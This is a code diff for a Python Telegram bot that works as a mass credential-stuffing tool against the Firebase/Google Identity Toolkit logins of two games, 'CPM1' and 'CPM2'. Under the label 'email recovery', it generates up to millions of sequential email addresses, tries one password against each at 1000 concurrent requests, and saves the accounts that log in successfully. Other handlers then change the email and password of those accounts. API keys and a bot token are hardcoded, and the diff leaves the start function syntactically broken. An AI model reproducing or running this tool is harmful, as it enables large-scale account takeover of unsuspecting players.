@@ -20,13 +20,14 @@ from telegram.ext import (
 )
 
 # ===== CONFIG =====
+CPM1_API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
+CPM2_API_KEY = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
 BOT_TOKEN = "8496323687:AAFLhc2UY4Z_afiKNjAFRfpg9i325oiv-UA"
 
 # ===== ADMIN CONFIG =====
-ADMIN_ID = 8650959684
+ADMIN_ID = 8650959684  # replace with your Telegram ID
 
 USERS_FILE = "users.txt"
-SERVERS_FILE = "servers.txt"
 
 # Load allowed users
 if os.path.exists(USERS_FILE):
@@ -43,31 +44,8 @@ def save_users():
         for uid in allowed_users:
             f.write(f"{uid}\n")
 
-# ===== DISTRIBUTED SERVER MANAGEMENT =====
-SERVERS_CACHE = []
 
-def load_servers():
-    """Load server list from servers.txt"""
-    global SERVERS_CACHE
-    if os.path.exists(SERVERS_FILE):
-        with open(SERVERS_FILE, "r") as f:
-            lines = f.readlines()
-            for line in lines:
-                line = line.strip()
-                if line and not line.startswith("#"):
-                    # Format: ip:port or url
-                    SERVERS_CACHE.append(line)
-    
-    if not SERVERS_CACHE:
-        print("⚠️  No servers configured. Create servers.txt with format:")
-        print("http://192.168.1.100:5000")
-        print("http://192.168.1.101:5000")
 
-load_servers()
-
-def get_servers():
-    """Get all available servers"""
-    return SERVERS_CACHE
 
 # ===== ADMIN COMMANDS =====
 
@@ -171,35 +149,6 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(text)
 
 
-async def status_servers(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin command to check server status"""
-    if update.effective_user.id != ADMIN_ID:
-        return
-
-    servers = get_servers()
-    num_servers = len(servers)
-    
-    status_text = f"""
-🖥️ **Distributed Servers Status**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Configured Servers: **{num_servers}**
-
-**Estimated Speed (99M emails):**
-- Concurrent: **{num_servers * 2000:,} requests/batch**
-- Speed: **~100K+ emails/sec**
-- Time: **~20-30 minutes**
-
-**Servers:**
-"""
-    for i, server in enumerate(servers[:10], 1):
-        status_text += f"{i}. {server}\n"
-    
-    if num_servers > 10:
-        status_text += f"... and {num_servers - 10} more servers\n"
-    
-    await update.message.reply_text(status_text, parse_mode="Markdown")
-
-
 # ===== ADMIN RECOVER COMMAND =====
 async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Admin-only email recovery command"""
@@ -210,22 +159,35 @@ async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     game_selection = """
-🔐 **ADMIN: Email Recovery (50-Server Distributed)**
+🔐 **ADMIN: Email Recovery**
 ━━━━━━━━━━━━━━━━━━━━━━
-Enter your game login URL:
+Select Your Game:
 
-Example:
-`https://game.com/api/login`
-or
-`https://game.com/login.php`
+1️⃣ Type: `cpm1` - Recover CPM1 Accounts
+2️⃣ Type: `cpm2` - Recover CPM2 Accounts
 
-Type the full login endpoint URL:
+Which game would you like to recover?
 """
     await update.message.reply_text(game_selection, parse_mode="Markdown")
-    context.user_data['step'] = 'admin_recover_url'
+    context.user_data['step'] = 'admin_recover_game'
 
 
-# ===== SCRAPING FUNCTIONS =====
+# ===== CPM FUNCTIONS =====
+def login_request(email, password, api_key):
+    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
+    payload = {"email": email, "password": password, "returnSecureToken": True}
+    response = requests.post(url, json=payload)
+    return response.json()
+
+def update_request(id_token, api_key, new_email=None, new_password=None):
+    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
+    payload = {"idToken": id_token, "returnSecureToken": True}
+    if new_email: payload["email"] = new_email
+    if new_password: payload["password"] = new_password
+    response = requests.post(url, json=payload)
+    return response.json()
+
+# ===== ULTRA-FAST EMAIL RECOVERY FUNCTIONS =====
 def parse_email_pattern(pattern):
     """Parse email patterns like tannercpm(10000)@gmail.com"""
     match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
@@ -241,134 +203,87 @@ def parse_email_pattern(pattern):
     
     return base, start, end, domain
 
-async def scrape_login(email, password, login_url, server_url, session=None):
-    """
-    Scrape game login page via distributed server
-    Uses server as proxy to avoid IP blocking
-    """
+async def fast_check_email(email, password, api_key, session=None):
+    """Fast async email check"""
     try:
-        # Send request through distributed server
-        proxy_url = f"{server_url}/check"
-        
-        payload = {
-            "email": email,
-            "password": password,
-            "login_url": login_url
-        }
+        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
+        payload = {"email": email, "password": password, "returnSecureToken": True}
         
         if session is None:
             async with aiohttp.ClientSession() as temp_session:
-                async with temp_session.post(
-                    proxy_url, 
-                    json=payload, 
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                async with temp_session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     data = await resp.json()
         else:
-            async with session.post(
-                proxy_url, 
-                json=payload, 
-                timeout=aiohttp.ClientTimeout(total=10)
-            ) as resp:
+            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 data = await resp.json()
         
-        status = data.get("status")
-        
-        if status == "found":
+        if "idToken" in data:
             return "found", data
-        elif status == "not_found":
+        
+        error = data.get("error", {}).get("message", "")
+        if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
             return "not_found", None
-        elif status == "wrong_password":
+        elif "INVALID_PASSWORD" in error:
             return "wrong_password", None
         else:
-            return "error", data.get("error")
+            return "error", error
             
     except asyncio.TimeoutError:
         return "timeout", None
     except Exception as e:
         return "error", str(e)
 
-async def check_emails_distributed_generator(base, start, end, domain, password, login_url, servers, progress_callback=None):
+async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=None):
     """
-    DISTRIBUTED SCRAPING: Distributes emails across 50+ servers
-    Each server handles concurrent requests
-    Total: 50 servers × 2000 concurrent = 100,000 concurrent requests
-    
-    Speed: ~100K+ emails/second
-    99M emails in ~20-30 minutes
+    UNLIMITED RANGE: Memory-efficient generator-based concurrent checking
+    Streams results instead of loading all into memory
+    MAXIMUM CONCURRENCY: 1000 concurrent requests per batch (auto-adjusted)
     """
     checked = 0
     total = end - start + 1
     found_count = 0
-    num_servers = len(servers)
     
-    if num_servers == 0:
-        print("❌ No servers configured!")
-        return
+    # Determine optimal batch size (1000 is the maximum safe limit)
+    # For massive ranges, we use 1000 concurrent requests
+    batch_size = min(1000, total)  # Use 1000 or total if smaller
     
-    # Distribute range evenly across all servers
-    chunk_size = total // num_servers
-    
-    # Process each server's chunk concurrently
-    async def process_server_chunk(server_idx, server_url, chunk_start, chunk_end):
-        nonlocal checked, found_count
-        
-        batch_size = 2000  # Max concurrent per server
-        
-        # Reuse session for this server
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=2000)) as session:
-            for batch_start in range(chunk_start, chunk_end + 1, batch_size):
-                batch_end = min(batch_start + batch_size, chunk_end + 1)
+    # Reuse session across all requests for maximum speed
+    # Limit set to 1000 for extreme concurrency
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=1000)) as session:
+        for batch_start in range(start, end + 1, batch_size):
+            batch_end = min(batch_start + batch_size, end + 1)
+            
+            # Create concurrent tasks for this batch (UP TO 1000 CONCURRENT)
+            tasks = []
+            for i in range(batch_start, batch_end):
+                email = f"{base}{i}@{domain}"
+                tasks.append(fast_check_email(email, password, api_key, session))
+            
+            # Execute all concurrently (up to 1000 at once)
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Process and yield results immediately (no memory buildup)
+            for i, result in enumerate(results):
+                checked += 1
+                email_num = batch_start + i
+                email = f"{base}{email_num}@{domain}"
                 
-                # Create concurrent tasks for this batch
-                tasks = []
-                for i in range(batch_start, batch_end):
-                    email = f"{base}{i}@{domain}"
-                    tasks.append(scrape_login(email, password, login_url, server_url, session))
+                if isinstance(result, tuple):
+                    status = result[0]
+                    data = result[1]
+                    if status == "found":
+                        found_count += 1
+                        yield (email, status, data)
+                else:
+                    pass  # Skip errors to save memory
                 
-                # Execute all concurrently (2000 at once per server)
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                
-                # Process results immediately
-                for i, result in enumerate(results):
-                    checked += 1
-                    email_num = batch_start + i
-                    email = f"{base}{email_num}@{domain}"
-                    
-                    if isinstance(result, tuple):
-                        status = result[0]
-                        data = result[1]
-                        if status == "found":
-                            found_count += 1
-                            yield (email, status, data)
-                    
-                    # Progress callback every 500 checks
-                    if progress_callback and checked % 500 == 0:
-                        await progress_callback(checked, total, found_count)
-    
-    # Create tasks for each server's chunk
-    async def merge_generators():
-        tasks_list = [
-            process_server_chunk(
-                idx, 
-                servers[idx], 
-                start + (idx * chunk_size), 
-                start + ((idx + 1) * chunk_size) if idx < num_servers - 1 else end
-            )
-            for idx in range(num_servers)
-        ]
-        
-        # Yield from all generators concurrently
-        for gen in tasks_list:
-            async for item in gen:
-                yield item
-    
-    async for item in merge_generators():
-        yield item
+                # Progress callback every 100 checks
+                if progress_callback and checked % 100 == 0:
+                    await progress_callback(checked, total, found_count)
 
 # ===== SESSIONS =====
-sessions = {}
-user_states = {}
+sessions = {}  # user_id -> {id_token, email, game_name, api_key}
+user_states = {}  # per-user step tracking
 
 # ===== MENU HELPERS =====
 def build_menu_text(user_id):
@@ -409,16 +324,6 @@ def is_allowed(user_id):
 # ==== START FUNCTION =====
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-
-    user_id = update.effective_user.id
-
-    if not is_allowed(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
-        return
-
-    await update.message.reply_text(
-        build_menu_text(user_id),
-        parse_mode="Markdown"
     )
 
 # ----- MESSAGE HANDLER -----
@@ -432,8 +337,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id != ADMIN_ID:
             return
         
+        # Parse the input - support comma, newline, or space separated IDs
         ids_text = update.message.text.strip()
         
+        # Try different separators
         if ',' in ids_text:
             user_ids = [x.strip() for x in ids_text.split(',')]
         elif '\n' in ids_text:
@@ -459,6 +366,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         save_users()
         
+        # Build response
         response = "📊 **Bulk Add Results:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
         
         if added:
@@ -478,24 +386,76 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ You are not authorized to use this bot.")
         return
 
-    # ----- ADMIN: RECOVER URL INPUT -----
-    elif step == 'admin_recover_url':
+    # ----- MAIN MENU COMMANDS -----
+    if text == "login":
+        if user_id in sessions:
+            await update.message.reply_text("⚠️ You are already logged in. Type `logout` first.")
+            return
+        
+        game_selection = """
+🎮 **Select Your Game:**
+━━━━━━━━━━━━━━━━━━━━━━
+Type one of the following:
+
+1️⃣ Type: `cpm1` - Login to CPM1
+2️⃣ Type: `cpm2` - Login to CPM2
+
+Which game would you like to login to?
+"""
+        await update.message.reply_text(game_selection, parse_mode="Markdown")
+        context.user_data['step'] = 'select_game'
+        return
+
+    elif text == "changemail":
+        if user_id not in sessions:
+            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
+            return
+        context.user_data['step'] = 'changemail'
+        await update.message.reply_text("✉️ Enter your new email address:")
+        return
+
+    elif text == "changepass":
+        if user_id not in sessions:
+            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
+            return
+        context.user_data['step'] = 'changepass'
+        await update.message.reply_text("🔑 Enter your new password:")
+        return
+
+    elif text == "logout":
+        if user_id in sessions:
+            del sessions[user_id]
+            await update.message.reply_text("🚪 Logged out successfully.\n\n" + build_menu_text(user_id), parse_mode="Markdown")
+        else:
+            await update.message.reply_text("⚠️ You are not logged in.", parse_mode="Markdown")
+        context.user_data.clear()
+        return
+
+    # ----- GAME SELECTION -----
+    elif step == 'select_game':
+        if text in ['cpm1', 'cpm2']:
+            game = text.upper()
+            context.user_data['login_game'] = game
+            context.user_data['api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
+            context.user_data['step'] = 'email'
+            await update.message.reply_text(f"📝 Enter your email for {game}:")
+        else:
+            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
+        return
+
+    # ----- ADMIN EMAIL RECOVERY GAME SELECTION -----
+    elif step == 'admin_recover_game':
         if user_id != ADMIN_ID:
             await update.message.reply_text("❌ Unauthorized.")
             return
-        
-        login_url = update.message.text.strip()
-        
-        # Validate URL
-        if not login_url.startswith("http"):
-            await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
-            return
-        
-        context.user_data['recover_login_url'] = login_url
-        context.user_data['step'] = 'admin_recover_pattern'
-        
-        recover_help = """
-📧 **ADMIN: Email Recovery (50-Server Distributed Scraping)**
+            
+        if text in ['cpm1', 'cpm2']:
+            game = text.upper()
+            context.user_data['recover_game'] = game
+            context.user_data['recover_api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
+            context.user_data['step'] = 'admin_recover_pattern'
+            recover_help = f"""
+📧 **ADMIN: Email Recovery for {game}**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Enter an email pattern to check:
@@ -505,15 +465,17 @@ Enter an email pattern to check:
 - `user(1000000-99999999)@gmail.com` - Checks 99M emails! 
 - `tannercpm(1-100000)@domain.com` - Checks 100K emails
 
-⚡ **DISTRIBUTED SCRAPING (50 SERVERS)**
-- 50 servers × 2000 concurrent each
-- Total: 100,000 concurrent requests
-- Speed: ~100K+ emails/sec
-- 99M emails in ~20-30 minutes
+⚡ **MAXIMUM CONCURRENCY MODE**
+- 1000 concurrent requests per batch
+- No limit on range size (1M-99M with ease)
+- Memory efficient streaming
+- Results streamed to JSON
 
 Enter your pattern:
 """
-        await update.message.reply_text(recover_help, parse_mode="Markdown")
+            await update.message.reply_text(recover_help, parse_mode="Markdown")
+        else:
+            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
         return
 
     # ----- ADMIN EMAIL RECOVERY PATTERN -----
@@ -559,36 +521,28 @@ Enter the password to check:
         start = context.user_data['recover_start']
         end = context.user_data['recover_end']
         domain = context.user_data['recover_domain']
-        login_url = context.user_data['recover_login_url']
-        
-        servers = get_servers()
-        num_servers = len(servers)
-        
-        if num_servers == 0:
-            await update.message.reply_text("❌ No servers configured! Add servers to servers.txt")
-            context.user_data.clear()
-            return
+        game = context.user_data['recover_game']
+        api_key = context.user_data['recover_api_key']
         
         total = end - start + 1
         
         start_time = time.time()
         
         progress_msg = await update.message.reply_text(f"""
-⚡ **DISTRIBUTED SCRAPING EMAIL RECOVERY**
+⚡ **MAXIMUM CONCURRENCY EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Login URL: **{login_url}**
+Game: **{game}**
 Pattern: **{base}({start:,}-{end:,})@{domain}**
 Total: **{total:,} emails**
 Status: **Starting...**
 
-Servers: **{num_servers}**
-Concurrency: **{num_servers * 2000:,} requests/batch**
+Concurrency: **1000 emails at a time**
 """, parse_mode="Markdown")
         
         await context.bot.send_chat_action(update.effective_chat.id, "typing")
         
         # Open file for streaming results
-        filename = f"recovery_distributed_{int(time.time())}.json"
+        filename = f"recovery_{game.lower()}_{int(time.time())}.json"
         found_emails = []
         checked_count = 0
         
@@ -602,34 +556,35 @@ Concurrency: **{num_servers * 2000:,} requests/batch**
             
             try:
                 await progress_msg.edit_text(f"""
-⚡ **DISTRIBUTED SCRAPING EMAIL RECOVERY**
+⚡ **MAXIMUM CONCURRENCY EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Game: **{game}**
 Pattern: **{base}({start:,}-{end:,})@{domain}**
-Checked: **{checked:,}/{total_emails:,}** ({int(checked/total_emails*100) if total_emails > 0 else 0}%)
+Checked: **{checked:,}/{total_emails:,}** ({int(checked/total_emails*100)}%)
 Speed: **{speed:.1f} emails/sec**
 Found: **{found}**
 ETA: **{int(remaining)}s**
-Servers: **{num_servers}** (Active)
 """, parse_mode="Markdown")
             except:
                 pass
         
-        # Run distributed check with generator
-        async for email, status, data in check_emails_distributed_generator(base, start, end, domain, password, login_url, servers, progress_callback=update_progress):
+        # Run concurrent check with generator (no memory buildup)
+        async for email, status, data in check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=update_progress):
             found_emails.append({
                 "email": email,
-                "password": password
+                "password": password,
+                "game": game
             })
         
         elapsed = time.time() - start_time
         
         # Create output file with results
         output_data = {
+            "game": game,
             "pattern": f"{base}({start:,}-{end:,})@{domain}",
             "total_checked": total,
             "time_seconds": round(elapsed, 2),
             "speed_emails_per_sec": round(total/elapsed, 2) if elapsed > 0 else 0,
-            "servers_used": num_servers,
             "found_count": len(found_emails),
             "successful_logins": found_emails
         }
@@ -643,10 +598,10 @@ Servers: **{num_servers}** (Active)
             results_text = f"""
 ✅ **RECOVERY COMPLETE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Game: **{game}**
 Found: **{len(found_emails)} account(s)** ✅
-Time: **{elapsed:.1f}s** ({elapsed/60:.1f} minutes)
+Time: **{elapsed:.1f}s**
 Speed: **{total/elapsed:.1f} emails/sec**
-Servers: **{num_servers}**
 
 📄 Results saved to file
 """
@@ -661,11 +616,90 @@ Servers: **{num_servers}**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 No matching accounts found.
 Checked: **{total:,}** emails
-Time: **{elapsed:.1f}s** ({elapsed/60:.1f} minutes)
+Time: **{elapsed:.1f}s**
 Speed: **{total/elapsed:.1f} emails/sec**
-Servers: **{num_servers}**
 """, parse_mode="Markdown")
         
+        context.user_data.clear()
+        return
+
+    # ----- EMAIL -----
+    elif step == 'email':
+        context.user_data['email'] = text
+        context.user_data['step'] = 'password'
+        await update.message.reply_text("🔒 Now enter your password:")
+        return
+
+    # ----- PASSWORD -----
+    elif step == 'password':
+        email = context.user_data['email']
+        password = text
+        api_key = context.user_data['api_key']
+        game_name = context.user_data['login_game']
+
+        # simulate loading
+        await context.bot.send_chat_action(update.effective_chat.id, "typing")
+        await asyncio.sleep(2)
+
+        resp = login_request(email, password, api_key)
+        if "idToken" not in resp:
+            error_msg = resp.get("error", {}).get("message", "Unknown error")
+            await update.message.reply_text(f"❌ Login failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
+            context.user_data.clear()
+            return
+
+        sessions[user_id] = {
+            "id_token": resp["idToken"],
+            "email": resp.get("email", email),
+            "game_name": game_name,
+            "api_key": api_key
+        }
+        await update.message.reply_text(f"✅ Logged in as {sessions[user_id]['email']} ({game_name})\n\n" + build_menu_text(user_id), parse_mode="Markdown")
+        context.user_data.clear()
+        return
+
+    # ----- CHANGE EMAIL -----
+    elif step == 'changemail':
+        if user_id not in sessions:
+            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
+            context.user_data.clear()
+            return
+        new_email = text
+        s = sessions[user_id]
+
+        await context.bot.send_chat_action(update.effective_chat.id, "typing")
+        await asyncio.sleep(1.5)
+
+        change_resp = update_request(s['id_token'], s['api_key'], new_email=new_email)
+        if "email" in change_resp:
+            s['email'] = change_resp['email']
+            s['id_token'] = change_resp.get('idToken', s['id_token'])
+            await update.message.reply_text(f"✉️ Email updated to {s['email']}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
+        else:
+            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
+            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
+        context.user_data.clear()
+        return
+
+    # ----- CHANGE PASSWORD -----
+    elif step == 'changepass':
+        if user_id not in sessions:
+            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
+            context.user_data.clear()
+            return
+        new_pass = text
+        s = sessions[user_id]
+
+        await context.bot.send_chat_action(update.effective_chat.id, "typing")
+        await asyncio.sleep(1.5)
+
+        change_resp = update_request(s['id_token'], s['api_key'], new_password=new_pass)
+        if "idToken" in change_resp:
+            s['id_token'] = change_resp['idToken']
+            await update.message.reply_text(f"🔑 Password changed successfully\n\n" + build_menu_text(user_id), parse_mode="Markdown")
+        else:
+            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
+            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
         context.user_data.clear()
         return
 
@@ -680,12 +714,8 @@ app.add_handler(CommandHandler("add", add_user))
 app.add_handler(CommandHandler("remove", remove_user))
 app.add_handler(CommandHandler("bulkadd", bulk_add_users))
 app.add_handler(CommandHandler("users", list_users))
-app.add_handler(CommandHandler("status", status_servers))
 app.add_handler(CommandHandler("recover", admin_recover))
 app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
 print("🚀 Bot is running...")
-print(f"Configured Servers: {len(get_servers())}")
-if len(get_servers()) == 0:
-    print("⚠️  Add servers to servers.txt (format: http://ip:port)")
 app.run_polling()
